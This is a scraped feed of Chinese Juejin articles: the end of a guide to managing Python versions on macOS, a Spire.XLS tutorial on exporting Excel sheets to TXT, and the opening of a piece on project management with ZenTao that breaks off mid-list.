    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n<span class="hljs-subst">{<span class="hljs-string">'='</span>*<span class="hljs-number">40</span>}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"测试 <span class="hljs-subst">{version}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'='</span>*<span class="hljs-number">40</span>)
    
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">import</span> subprocess
        result = subprocess.run([version, <span class="hljs-string">'-c'</span>, test_code], 
                              capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>)
        <span class="hljs-built_in">print</span>(result.stdout)
        <span class="hljs-keyword">if</span> result.stderr:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"错误: <span class="hljs-subst">{result.stderr}</span>"</span>)
    <span class="hljs-keyword">except</span> FileNotFoundError:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{version}</span> 未安装"</span>)
</code></pre>
<h2 data-id="heading-21">最佳实践建议</h2>
<h3 data-id="heading-22">1. 项目结构规范</h3>
<pre><code class="hljs language-bash" lang="bash">my_project/
├── .python-version          <span class="hljs-comment"># pyenv版本文件</span>
├── .<span class="hljs-built_in">env</span>                     <span class="hljs-comment"># 环境变量</span>
├── requirements.txt         <span class="hljs-comment"># 生产依赖</span>
├── requirements-dev.txt     <span class="hljs-comment"># 开发依赖</span>
├── src/                     <span class="hljs-comment"># 源代码</span>
├── tests/                   <span class="hljs-comment"># 测试代码</span>
└── venv/                    <span class="hljs-comment"># 虚拟环境（.gitignore）</span>
</code></pre>
<h3 data-id="heading-23">2. 版本锁定</h3>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># requirements.txt</span>
<span class="hljs-attr">numpy</span>==<span class="hljs-number">1.24</span>.<span class="hljs-number">0</span>
<span class="hljs-attr">opencv-python</span>==<span class="hljs-number">4.8</span>.<span class="hljs-number">1.78</span>
<span class="hljs-attr">pandas</span>==<span class="hljs-number">2.0</span>.<span class="hljs-number">3</span>
<span class="hljs-attr">scikit-learn</span>==<span class="hljs-number">1.3</span>.<span class="hljs-number">0</span>

<span class="hljs-comment"># requirements-dev.txt</span>
-r requirements.txt
<span class="hljs-attr">pytest</span>==<span class="hljs-number">7.4</span>.<span class="hljs-number">0</span>
<span class="hljs-attr">black</span>==<span class="hljs-number">23.7</span>.<span class="hljs-number">0</span>
<span class="hljs-attr">flake8</span>==<span class="hljs-number">6.0</span>.<span class="hljs-number">0</span>
</code></pre>
<h3 data-id="heading-24">3. 自动化脚本</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Makefile</span>
.PHONY: install <span class="hljs-built_in">test</span> lint clean

install:
	pip install -r requirements.txt
	pip install -r requirements-dev.txt

<span class="hljs-built_in">test</span>:
	pytest tests/ -v

lint:
	black src/
	flake8 src/

clean:
	find . -<span class="hljs-built_in">type</span> d -name <span class="hljs-string">"__pycache__"</span> -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">rm</span> -rf {} +
	find . -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">"*.pyc"</span> -delete
</code></pre>
<h2 data-id="heading-25">总结</h2>
<p>在Mac上管理多版本Python看似复杂，但掌握正确工具和方法后，其实非常简单。关键点总结：</p>
<ol>
<li><strong>新手入门</strong>：从Homebrew开始，简单直接</li>
<li><strong>专业开发</strong>：使用pyenv，灵活强大</li>
<li><strong>项目隔离</strong>：务必使用虚拟环境</li>
<li><strong>问题排错</strong>：分段测试，逐步定位</li>
<li><strong>版本控制</strong>：锁定依赖，确保可重现</li>
</ol>
<p>记住，良好的环境管理习惯能节省大量调试时间。投资时间学习这些工具，将在未来获得丰厚回报。</p>
<h2 data-id="heading-26">扩展资源</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpyenv%2Fpyenv" target="_blank" title="https://github.com/pyenv/pyenv" ref="nofollow noopener noreferrer">pyenv官方文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.python.org%2F3%2Ftutorial%2Fvenv.html" target="_blank" title="https://docs.python.org/3/tutorial/venv.html" ref="nofollow noopener noreferrer">Python虚拟环境教程</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.opencv.org%2F4.x%2Fd0%2Fde3%2Ftutorial_py_intro.html" target="_blank" title="https://docs.opencv.org/4.x/d0/de3/tutorial_py_intro.html" ref="nofollow noopener noreferrer">OpenCV-Python安装指南</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fsourabhbajaj.com%2Fmac-setup%2F" target="_blank" title="https://sourabhbajaj.com/mac-setup/" ref="nofollow noopener noreferrer">Mac开发环境配置大全</a></li>
</ul>
<hr/>
<p><em>本文基于实际开发经验总结，适用于macOS 12+系统，Python 3.8+版本。如有问题或建议，欢迎留言讨论。</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从 Excel 到 TXT：用 Python 和 Spire.XLS 轻松完成数据转换]]></title>    <link>https://juejin.cn/post/7603054272158629938</link>    <guid>https://juejin.cn/post/7603054272158629938</guid>    <pubDate>2026-02-05T09:22:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603054272158629938" data-draft-id="7602982045138501678" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从 Excel 到 TXT：用 Python 和 Spire.XLS 轻松完成数据转换"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-05T09:22:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LSTM97"/> <meta itemprop="url" content="https://juejin.cn/user/2253353867033484"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从 Excel 到 TXT：用 Python 和 Spire.XLS 轻松完成数据转换
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2253353867033484/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LSTM97
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:22:24.000Z" title="Thu Feb 05 2026 09:22:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在数据处理和分析的过程中，经常需要将不同格式的数据进行转换。Excel 文件是数据存储和操作中非常常见的格式，而 TXT 文件凭借其简单的文本格式，常用于数据共享和处理。本文将介绍如何使用 Python 和 Spire.XLS 库将 Excel 导出为 TXT 文件。</p>
<h2 data-id="heading-0">环境准备</h2>
<p>要实现这个功能，我们需要确保已安装 Spire.XLS for Python 库。如果尚未安装，可以通过如下命令进行安装：</p>
<pre><code class="hljs">pip install Spire.XLS
</code></pre>
<p>此库提供了丰富的 Excel 文件处理功能，可以方便地进行读取、编辑和保存操作。</p>
<h2 data-id="heading-1">示例代码</h2>
<p>下面是一个完整的示例代码，展示了如何将 Excel 文件导出为 TXT 文件：</p>
<pre><code class="hljs language-ini" lang="ini">import os
import sys

<span class="hljs-comment"># 获取当前文件路径</span>
<span class="hljs-attr">curPath</span> = os.path.abspath(os.path.dirname(__file__))
<span class="hljs-attr">rootPath</span> = os.path.split(curPath)[<span class="hljs-number">0</span>]
sys.path.append(rootPath)

from spire.xls import *
from spire.xls.common import *

<span class="hljs-comment"># 输入和输出文件的路径</span>
<span class="hljs-attr">inputFile</span> = <span class="hljs-string">"Input.xlsx"</span>
<span class="hljs-attr">outputFile</span> = <span class="hljs-string">"output.txt"</span>

<span class="hljs-comment"># 创建Workbook对象 </span>
<span class="hljs-attr">workbook</span> = Workbook()

<span class="hljs-comment"># 加载一个Excel文件</span>
workbook.LoadFromFile(inputFile)

<span class="hljs-comment"># 获取第一张工作表</span>
<span class="hljs-attr">sheet</span> = workbook.Worksheets[<span class="hljs-number">0</span>]

<span class="hljs-comment"># 将工作表保存为TXT文件</span>
sheet.SaveToFile(outputFile, " ", Encoding.get_UTF8())
workbook.Dispose()
</code></pre>
<h3 data-id="heading-2">代码解析</h3>
<ol>
<li><strong>环境配置</strong></li>
</ol>
<p>我们首先导入必要的模块，为后续文件操作做准备。通过 <code>os</code> 和 <code>sys</code> 模块，我们获取了当前文件的路径，以便进行文件导入和导出。</p>
<ol start="2">
<li><strong>创建 Workbook 对象</strong></li>
</ol>
<p>使用 <code>Workbook()</code> 类创建一个新的工作簿对象。这是操作 Excel 文件的基础。</p>
<ol start="3">
<li><strong>加载 Excel 文件</strong></li>
</ol>
<p>通过 <code>LoadFromFile</code> 方法，我们加载了指定的 Excel 文件。在这个示例中，文件名为 "测试.xlsx"。</p>
<ol start="4">
<li><strong>获取工作表</strong></li>
</ol>
<p>在 Excel 文件中，可以有多个工作表。这里我们通过 <code>workbook.Worksheets[0]</code> 获取第一个工作表。索引从 0 开始，因此 <code>[0]</code> 表示第一张工作表。</p>
<ol start="5">
<li><strong>导出为 TXT 文件</strong></li>
</ol>
<p>使用 <code>SaveToFile</code> 方法将工作表导出为 TXT 文件。在此参数中，我们设置了输出文件名以及列分隔符（在这里使用空格 <code>" "</code>）。同时我们还指定了文件编码为 UTF-8，确保支持多种语言字符的正确显示。</p>
<ol start="6">
<li><strong>释放资源</strong></li>
</ol>
<p>最后，使用 <code>Dispose()</code> 方法释放工作簿所占用的资源，确保程序的稳定性。</p>
<h2 data-id="heading-3">小结</h2>
<p>通过以上步骤，我们成功使用 Python 将 Excel 文件导出为 TXT 格式。Spire.XLS 提供了简洁的方法，使得操作 Excel 文件变得极为简单，尤其适合于需要批量处理或自动化脚本的场景。</p>
<p>对于更复杂的需求，如需处理多个工作表或对数据进行格式化、筛选等，可以进一步改善代码逻辑和添加相应功能。此外，Spire.XLS 还支持对 Excel 文件的其他灵活操作，如修改单元格内容、添加图表等，用户可以根据需求更深入地探索该库的功能。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[禅道管理工具]]></title>    <link>https://juejin.cn/post/7603185231801434138</link>    <guid>https://juejin.cn/post/7603185231801434138</guid>    <pubDate>2026-02-05T09:34:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603185231801434138" data-draft-id="7602893600252182574" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="禅道管理工具"/> <meta itemprop="keywords" content="工作流引擎"/> <meta itemprop="datePublished" content="2026-02-05T09:34:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哪里的破水瓶"/> <meta itemprop="url" content="https://juejin.cn/user/4394111849466414"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            禅道管理工具
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4394111849466414/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哪里的破水瓶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:34:18.000Z" title="Thu Feb 05 2026 09:34:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#444;background-image:linear-gradient(90deg,rgba(59,59,59,.1) 3%,transparent 0),linear-gradient(1turn,rgba(122,120,121,.1) 3%,transparent 0);background-size:30px 30px;background-position:50%;letter-spacing:1px;word-spacing:1px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{position:relative;margin-top:34px;margin-bottom:16px;font-weight:700;line-height:1.3;cursor:text;color:#444;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body h1{font-size:41px;margin-bottom:34px;line-height:1.5}.markdown-body h1:before{content:""}.markdown-body h2{font-size:30px;padding-left:.4em;border-left:.4em solid #5e5e5e;border-bottom:1px solid #444}.markdown-body h2:after{content:"🕛";position:absolute;top:0;right:0;transition:all;animation:rotate 10s linear infinite}@keyframes rotate{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.markdown-body h3{border-left:.4em solid #8d8d8d;font-size:24px;padding-left:.4em}.markdown-body h4{font-size:20px}.markdown-body h5{font-size:16px}.markdown-body h6{font-size:14px}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body table,.markdown-body ul{margin:.8em 0}.markdown-body strong{font-weight:1000;position:relative;color:#444;padding:0 3px}.markdown-body em{font-weight:inherit}.markdown-body a{box-sizing:border-box;color:grey;position:relative}.markdown-body a:before{position:absolute;box-sizing:border-box;content:"Go -&gt;";left:0;width:100%;max-width:0;color:#fff;background-color:hsla(0,0%,50.2%,.8);white-space:nowrap;transition:.2s ease;pointer-events:none;overflow:hidden}.markdown-body a:after{content:"";position:absolute;bottom:0;left:0;width:100%;height:1px;background-color:grey}.markdown-body a:active:before,.markdown-body a:hover:before{max-width:100%;padding-left:8px;border-radius:5px}.markdown-body hr{position:relative;width:100%;height:1px;border:none;margin-top:36px;margin-bottom:36px;background:linear-gradient(90deg,grey,#f1f1f1,#444,#444,#f1f1f1,grey);overflow:visible}.markdown-body ol,.markdown-body ul{padding-left:32px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px;list-style:inherit}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol{counter-reset:my-counter}.markdown-body ol&gt;li{padding-left:6px;list-style:none;counter-increment:my-counter;position:relative}.markdown-body ol&gt;li:before{position:absolute;left:-1.5em;content:counter(my-counter);font-weight:700}.markdown-body ol&gt;li:first-child:before{content:"1️⃣"}.markdown-body ol&gt;li:nth-child(2):before{content:"2️⃣"}.markdown-body ol&gt;li:nth-child(3):before{content:"3️⃣"}.markdown-body ol&gt;li:nth-child(4):before{content:"4️⃣"}.markdown-body ol&gt;li:nth-child(5):before{content:"5️⃣"}.markdown-body ol&gt;li:nth-child(6):before{content:"6️⃣"}.markdown-body ol&gt;li:nth-child(7):before{content:"7️⃣"}.markdown-body ol&gt;li:nth-child(8):before{content:"8️⃣"}.markdown-body ol&gt;li:nth-child(9):before{content:"9️⃣"}.markdown-body ol&gt;li:nth-child(10):before{content:"🔟"}.markdown-body ul&gt;li{list-style:none;position:relative}.markdown-body ul&gt;li:before{z-index:10;position:absolute;left:-1.57em;content:"🔹";margin-right:12px}.markdown-body ul&gt;li input{margin-left:8px!important}.markdown-body blockquote{position:relative;background-color:#d3d3d3;padding:5px 10px;border-left:.2em solid #000;border-radius:3px;transition:all .8s ease}.markdown-body blockquote:hover{opacity:.7}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(69,69,77,.8);color:#fff;font-size:.87em;padding:.07em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:7px;overflow:hidden}.markdown-body pre:before{z-index:10;position:absolute;top:14px;left:14px;width:12px;height:12px;border-radius:50%;background:#fc625d;-webkit-box-shadow:20px 0 #fdbc40,40px 0 #35cd4b;box-shadow:20px 0 #fdbc40,40px 0 #35cd4b;content:" "}.markdown-body pre:after{z-index:9;content:"";position:absolute;width:100%;height:40px;top:0;background-color:#1a1a1a}.markdown-body pre&gt;code{display:block;font-family:Menlo,Monaco,Consolas,Courier New,monospace;word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#171717;color:#bababa;font-size:14px;padding:40px 20px 20px}.markdown-body del{color:grey}.markdown-body table{margin-bottom:1.25rem;border-collapse:collapse}.markdown-body table td,.markdown-body table th{margin:0;padding:8px;line-height:20px;vertical-align:middle;border:1px solid #ddd}.markdown-body table thead,.markdown-body table tr:nth-child(2n){background-color:#fcfcfc}.markdown-body table thead th,.markdown-body table tr:nth-child(2n) th{font-weight:700;vertical-align:middle;color:#444}.markdown-body table tbody tr td{font-weight:400;color:#444}.markdown-body table tbody tr:hover{background-color:#d3d3d3}.markdown-body table tbody tr:hover td{color:#fff}.markdown-body img{max-width:100%;margin:0 12px}@media (max-width:720px){.markdown-body h1{font-size:32.8px}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:19.2px}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:12.8px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">什么是项目管理</h2>
<p>项目管理是一个复杂而细致的过程，它涉及对软件项目进行全面规划、执行、监控和控制，以确保项目能够按照预定的时间、成本和质量标准顺利完成。这个过程涵盖了多个关键方面：</p>
<ol>
<li>
<p>项目规划：</p>
<ol>
<li>确定项目的目标、范围、时间和预算。</li>
<li>制定详细的项目计划，包括工作分解结构（WBS）、资源分配、里程碑和关键路径。</li>
<li>识别潜在的风险，并制定相应的风险应对策略。</li>
</ol>
</li>
<li>
<p>团队组建与管理：</p>
<ol>
<li>组建一个跨职能的团队，包括开发人员、测试人员、设计师等。</li>
<li>明确每个团队成员的角色和责任。</li>
<li>促进团队沟通，确保信息在团队内部流通无阻。</li>
</ol>
</li>
<li>
<p>需求管理：</p>
<ol>
<li>与客户或利益相关者合作，明确并记录软件需求。</li>
<li>对需求进行优先级排序，并制定需求变更管理流程。</li>
</ol>
</li>
<li>
<p>进度与质量管理：</p>
<ol>
<li>使用敏捷开发方法（如Scrum）或传统项目管理方法（如瀑布模型）来管理项目进度。</li>
<li>实施质量控制措施，如代码审查、单元测试和集成测试。</li>
</ol>
</li>
<li>
<p>风险与变更管理：</p>
<ol>
<li>定期评估项目风险，并更新风险应对策略。</li>
<li>管理项目变更，确保变更得到妥善处理并记录。</li>
</ol>
</li>
<li>
<p>沟通与报告：</p>
<ol>
<li>定期向项目团队、客户和其他利益相关者报告项目进展。</li>
<li>确保所有相关方都了解项目的当前状态、已完成的工作以及接下来的计划。</li>
</ol>
</li>
<li>
<p>项目收尾：</p>
<ol>
<li>完成所有剩余工作，确保软件满足所有要求。</li>
<li>进行项目回顾，总结经验教训，以便在未来的项目中加以改进。</li>
<li>将项目成果交付给客户，并确保他们满意。</li>
</ol>
</li>
</ol>
<h3 data-id="heading-1">项目管理常见的工具</h3>
<ul>
<li>禅道：一款功能全面、易于上手的国产项目管理软件，特别适合中小团队进行敏捷开发和项目管理。</li>
<li>PingCode：研发全生命周期覆盖的项目管理系统，功能丰富，适用于各种规模的研发团队。</li>
<li>Worktile：市场占有率高的项目管理工具，自定义能力强，满足多种项目管理需求。</li>
<li>Redmine：开源的项目管理软件，集成缺陷跟踪，支持多项目和子项目管理。</li>
<li>Jira：全球知名的IT项目管理软件，广泛应用于缺陷跟踪、任务跟踪和敏捷管理。</li>
</ul>
<h3 data-id="heading-2">禅道安装</h3>
<p>禅道是一款国产的开源<strong>项目管理软件</strong>，它专注于项目管理，内置了多种核心功能，旨在帮助项目团队成员高效地进行项目规划、任务追踪、质量管理、文档管理等。</p>
<p><strong>核心功能：</strong></p>
<ul>
<li>产品管理：包括需求、计划、发布、路线图等功能，帮助产品经理整理和管理产品需求，制定产品规划。</li>
<li>项目管理：提供任务分配、团队协作、进度跟踪（如燃尽图）、项目里程碑设置等功能，确保项目按计划推进。</li>
<li>质量管理：集成缺陷管理、测试用例管理和测试任务管理，支持测试人员记录和跟踪问题，确保产品质量。</li>
<li>文档管理：方便地跟踪产品和项目过程中产生的文档，支持文档库的建设和共享。</li>
<li>事务管理：包括个人事务管理功能，如TODO列表、<strong>我的任务</strong>、<strong>我的Bug</strong>等，帮助团队成员管理个人工作。</li>
<li>组织管理：支持部门、用户、分组、权限等管理，确保项目团队的组织架构清晰，权限分配合理。</li>
<li>统计与搜索：提供丰富的统计报表和强大的搜索功能，帮助项目团队快速获取项目信息，进行数据分析。</li>
<li>扩展与集成：禅道支持灵活的扩展机制，用户可以根据需求进行二次开发。同时，禅道还提供了API机制，方便与其他系统集成。</li>
</ul>
<p><strong>项目团队成员如何使用禅道</strong></p>
<ol>
<li>
<p>产品经理：</p>
<ol>
<li>在禅道中创建和管理产品需求，制定产品规划，将需求转化为具体的计划或迭代任务。</li>
